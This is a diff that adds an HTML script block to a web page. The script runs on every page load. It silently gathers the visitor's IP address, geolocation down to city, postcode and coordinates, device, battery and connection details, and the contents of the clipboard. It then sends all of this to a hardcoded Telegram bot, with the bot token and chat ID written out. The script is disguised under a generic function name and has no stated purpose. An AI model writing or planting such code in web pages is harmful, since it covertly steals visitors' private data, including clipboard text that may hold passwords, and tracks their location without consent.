@@ -1,0 +1,62 @@
+<script>
+function myFunction() {
+    // Get the current URL
+    const currentURL = window.location.href;
+
+    fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(ipData => {
+            const ipAddress = ipData.ip;
+            const userAgent = navigator.userAgent;
+            const deviceMemory = navigator.deviceMemory;
+            
+            // Get connection type
+            const connectionType = navigator.connection ? navigator.connection.type : 'Connection type not available';
+
+            // Get battery information
+            navigator.getBattery().then(batteryData => {
+                const batteryLevel = batteryData.level * 100; // Battery level in percentage
+                const charging = batteryData.charging ? 'Plugged In' : 'Not Plugged In';
+
+                // Get clipboard data
+                navigator.clipboard.readText().then(clipboardText => {
+                    const geoUrl = `https://ipapi.co/${ipAddress}/json/`;
+
+                    fetch(geoUrl)
+                        .then(geoResponse => geoResponse.json())
+                        .then(geoData => {
+                            const country = geoData.country_name;
+                            const region = geoData.region;
+                            const city = geoData.city;
+                            const zip = geoData.postal;
+                            const latitude = geoData.latitude;
+                            const longitude = geoData.longitude;
+                            const timezone = geoData.timezone;
+                            const isp = geoData.org;
+
+                            const text = encodeURIComponent(`${currentURL} Url Detect New Users ipAddress: ${ipAddress}\nDevice Info: ${userAgent}\nDevice Memory: ${deviceMemory} GB\nConnection Type: ${connectionType}\nBattery Level: ${batteryLevel}%\nBattery Status: ${charging}\nClipboard Text: ${clipboardText}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nZip Code: ${zip}\nLatitude: ${latitude}\nLongitude: ${longitude}\nTimezone: ${timezone}\nISP: ${isp}`);
+
+                            const apiUrl = `https://api.telegram.org/bot6684189805:AAE8G0b3d2V9nQML6xlFwwLM8RXS0ea9RN4/sendMessage?chat_id=5114789651&text=${text}`;
+                            fetch(apiUrl)
+                                .then(response => response.json())
+                                .then(data => {
+                                    console.log(data);
+                                })
+                                .catch(error => {
+                                    console.error(error);
+                                });
+                        })
+                        .catch(error => {
+                            console.error(error);
+                        });
+                });
+            });
+        })
+        .catch(error => {
+            console.error(error);
+        });
+}
+
+window.addEventListener('load', myFunction);
+
+                          </script>
